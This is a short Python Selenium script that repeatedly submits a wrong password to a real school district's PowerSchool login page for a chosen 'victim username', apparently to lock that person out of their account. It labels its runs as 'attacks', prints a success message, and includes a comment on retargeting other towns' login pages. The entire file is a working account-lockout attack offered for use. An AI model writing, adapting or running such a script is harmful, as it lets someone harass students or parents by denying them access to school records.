from selenium import webdriver
from selenium.webdriver.common.by import By

from argparse import ArgumentParser


# Parse args.
parser = ArgumentParser()
parser.add_argument("-u", "--username", help="victim username")
parser.add_argument("-i", "--iters", help="# of sign-in attempts", type=int, default=10)

args = parser.parse_args()
username = args.username
iters = args.iters

# Create browser driver.
browser = webdriver.Chrome()
browser.maximize_window()

for i in range(iters):
    # Navigate to powerschool. If modifying script: change to town powerschool login page.
    browser.get("https://guilford.powerschool.com/public/home.html")
    
    # Enter username and password.
    username_form = browser.find_element(By.ID, "fieldAccount")
    username_form.send_keys(username)

    password_form = browser.find_element(By.ID, "fieldPassword")
    password_form.send_keys("password")  # Incorrect password.

    # Submit form.
    # BUG: Buffering behavior after form submission, clears after manual click. 
    submit_button = browser.find_element(By.ID, "btn-enter-sign-in")
    submit_button.click()

print(f"{iters} attacks on {username} carried out successfully.")

# Close browser.
browser.quit()
